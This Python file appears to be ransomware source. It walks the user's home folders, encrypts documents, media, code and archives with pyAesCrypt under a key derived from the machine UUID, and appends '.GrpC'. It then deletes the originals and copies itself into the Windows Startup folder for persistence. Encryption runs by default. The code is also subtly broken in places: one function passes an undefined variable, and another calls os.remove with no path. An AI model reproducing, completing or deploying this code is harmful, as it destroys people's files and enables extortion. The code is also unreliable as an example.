import os
import subprocess
import sys
from shutil import copy2
from hashlib import sha256, sha512
from pyAesCrypt import encryptFile, decryptFile

project_name = sys.argv[0]
filext = ".GrpC"
filelimit = 1024 * 1024 * 1024 # 1 GB
allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]

def find_files(mode="E"):
    allFiles = []
    valid_extensions = ["doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid", "exe", "zip"]
    username = os.path.expanduser("~")
    for dirs in allowed_dirs:
        for root, subfiles, files in os.walk(os.path.join(username, dirs)):
            for names in files:
                if mode == "E":
                    if names == project_name or names.split(".")[-1].lower() not in valid_extensions:
                        continue
                    allFiles.append(os.path.join(root, names))
                if mode == "D":
                    if names.split(".")[-1].lower() != filext.replace(".", "").lower():
                        continue
                    allFiles.append(os.path.join(root, names))
    return allFiles

def encryptFiles(files, password):
    files = filter_file_size(file)
    for file in files:
        try:
            encryptFile(file, file+filext, password, 64 * 1024)
            os.remove(file)
        except:
            pass

def decryptFiles(files, password):
    for file in files:
        try:
            decryptFile(file, ".".join(file.split(".")[:-1]), password, 64 * 1024)
            os.remove(file)
        except:
            pass

def filter_file_size(files):
    files = list(filter(lambda x: os.stat(x).st_size <= filelimit, files))
    return files

def persistence():
    username = os.path.expanduser("~")
    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    current_path = os.path.join(username, os.getcwd(), project_name)
    if not os.path.exists(os.path.join(path, project_name)):
        copy2(current_path, path)

def genpass():
     password = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
     password = sha512(password.encode()).hexdigest()
     password = sha256(password.encode()).hexdigest()
     return password

def checkCompletion(check=True):
    username = os.path.expanduser("~")
    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
    if check:
        if os.path.exists(path):
            return False
        else:
            return True
    else:
        with open(path, "w") as f:
            f.write(".LOG")

def removepersistence():
    username = os.path.expanduser("~")
    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
    os.remove()


def start(mode="E"):
    password = genpass()
    files_t = find_files(mode)
    if mode == "E":
        if checkCompletion():
            persistence()
            encryptFiles(files_t, password)
            checkCompletion(check=False)
    else:
        decryptFiles(files_t, password)
        removepersistence()

if __name__ == "__main__":
    start(mode="E")
